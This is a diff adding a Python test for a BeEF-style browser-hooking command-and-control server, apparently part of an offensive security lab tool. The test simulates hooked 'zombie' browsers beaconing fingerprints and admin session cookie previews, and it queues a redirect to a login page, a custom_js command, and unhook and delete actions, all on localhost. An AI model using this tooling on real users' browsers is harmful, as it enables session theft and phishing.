@@ -787,3 +787,115 @@ def test_29_abrupt_client_socket_reset_and_gzip_delta_polling_emit_zero_tracebac
             ui_sess.lab_server.stop()
 
 
+def test_30_beef_zombie_inventory_online_offline_and_session_management(monkeypatch):
+    """BeEF-style inventory: online/offline zombies, browser fingerprinting, parameterised modules, unhook/delete."""
+    import base64
+    import time
+    from web.warroom_ui import start_warroom_server
+    import tools.beef as beef_mod
+
+    httpd, ui_sess = start_warroom_server(host="127.0.0.1", port=0, auto_lab=True, block=False)
+    ui_port = httpd.server_address[1]
+    base = f"http://127.0.0.1:{ui_port}"
+    auth_hdr = "Basic " + base64.b64encode(b"admin:bugsBounty").decode()
+
+    def post(path, payload, auth=True):
+        headers = {"Content-Type": "application/json"}
+        if auth:
+            headers["Authorization"] = auth_hdr
+        return json.loads(
+            urllib.request.urlopen(
+                urllib.request.Request(f"{base}{path}", data=json.dumps(payload).encode(), headers=headers),
+                timeout=5,
+            ).read().decode()
+        )
+
+    def get_json(path):
+        return json.loads(
+            urllib.request.urlopen(
+                urllib.request.Request(f"{base}{path}", headers={"Authorization": auth_hdr}), timeout=5
+            ).read().decode()
+        )
+
+    try:
+        # 1) Two zombies beacon with real UAs -> the inventory identifies browser / OS / engine, like BeEF does
+        post("/beef/beacon?sid=hk-chrome01&fid=fid-a", {
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
+                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "title": "VulnCorp Treasury", "href": f"{base}/beef/victim", "origin": base,
+            "cookie_len": 42, "cookie_preview": "vc_admin_session=eyJ...", "forms": 2, "inputs": 7,
+            "links": 11, "local_keys": 2, "platform": "MacIntel", "screen": "1512x982", "lang": "en-AU",
+        }, auth=False)
+        post("/beef/beacon?sid=hk-firefox02&fid=fid-b", {
+            "ua": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "title": "Old tab", "href": f"{base}/beef/victim", "cookie_len": 0,
+        }, auth=False)
+
+        beef = get_json("/api/state")["beef"]
+        by_sid = {s["sid"]: s for s in beef["sessions_list"]}
+        assert set(by_sid) >= {"hk-chrome01", "hk-firefox02"}
+        assert by_sid["hk-chrome01"]["browser"] == "Chrome 120 · macOS"
+        assert by_sid["hk-chrome01"]["engine"] == "Blink"
+        assert by_sid["hk-chrome01"]["host"] == f"127.0.0.1:{ui_port}"
+        assert by_sid["hk-chrome01"]["cookies"] == 42
+        assert by_sid["hk-chrome01"]["forms"] == 2 and by_sid["hk-chrome01"]["links"] == 11
+        assert by_sid["hk-firefox02"]["browser"] == "Firefox 121 · Linux"
+        assert by_sid["hk-firefox02"]["engine"] == "Gecko"
+        # other tests may have hooked sessions on the shared C2 singleton — only assert on ours
+        assert all(by_sid[sid]["online"] for sid in ("hk-chrome01", "hk-firefox02"))
+        assert beef["online_count"] >= 2
+
+        # 2) A zombie that stops beaconing drops into the offline group without being forgotten
+        monkeypatch.setattr(beef_mod, "ONLINE_WINDOW_S", 0.05)
+        time.sleep(0.2)
+        beef = get_json("/api/state")["beef"]
+        by_sid = {s["sid"]: s for s in beef["sessions_list"]}
+        assert all(by_sid[sid]["online"] is False for sid in ("hk-chrome01", "hk-firefox02"))
+        assert beef["offline_count"] >= 2
+        monkeypatch.undo()
+
+        # 3) Parameterised modules are rendered server-side from declared fields (no client-supplied JS needed)
+        err = None
+        try:
+            post("/api/beef/command", {"sid": "hk-chrome01", "module": "redirect_browser", "values": {}})
+        except urllib.error.HTTPError as exc:
+            err = exc
+        assert err is not None and err.code == 400
+
+        redir = post("/api/beef/command", {
+            "sid": "hk-chrome01", "module": "redirect_browser",
+            "values": {"url": "https://login.lab.local/sso?next=%2Ftreasury"},
+        })
+        assert redir["ok"] is True
+        polled = json.loads(urllib.request.urlopen(f"{base}/beef/poll?session=hk-chrome01", timeout=5).read().decode())
+        assert polled["cmds"][0]["module"] == "redirect_browser"
+        assert "https://login.lab.local/sso?next=%2Ftreasury" in polled["cmds"][0]["js"]
+        post(f"/beef/result?session=hk-chrome01", {"id": polled["cmds"][0]["id"], "output": "redirecting"}, auth=False)
+
+        # 4) Unknown zombie is rejected instead of silently queuing into the void
+        err = None
+        try:
+            post("/api/beef/command", {"sid": "hk-ghost", "module": "custom_js", "js": "1+1"})
+        except urllib.error.HTTPError as exc:
+            err = exc
+        assert err is not None and err.code == 404
+
+        # 5) Unhook -> the implant stops polling and the session is dropped once its result lands
+        unhook = post("/api/beef/session", {"sid": "hk-chrome01", "action": "unhook"})
+        assert unhook["queued"] == "unhook"
+        polled = json.loads(urllib.request.urlopen(f"{base}/beef/poll?session=hk-chrome01", timeout=5).read().decode())
+        assert polled["cmds"][0]["module"] == "unhook"
+        post(f"/beef/result?session=hk-chrome01", {"id": polled["cmds"][0]["id"], "module": "unhook", "ok": True}, auth=False)
+        beef = get_json("/api/state")["beef"]
+        assert "hk-chrome01" not in {s["sid"] for s in beef["sessions_list"]}
+
+        # 6) Delete forgets a zombie outright
+        dele = post("/api/beef/session", {"sid": "hk-firefox02", "action": "delete"})
+        assert dele["ok"] is True
+        assert "hk-firefox02" not in {s["sid"] for s in dele["beef"]["sessions_list"]}
+        assert "hk-firefox02" not in {s["sid"] for s in get_json("/api/state")["beef"]["sessions_list"]}
+    finally:
+        httpd.shutdown()
+        httpd.server_close()
+        if ui_sess.lab_server:
+            ui_sess.lab_server.stop()
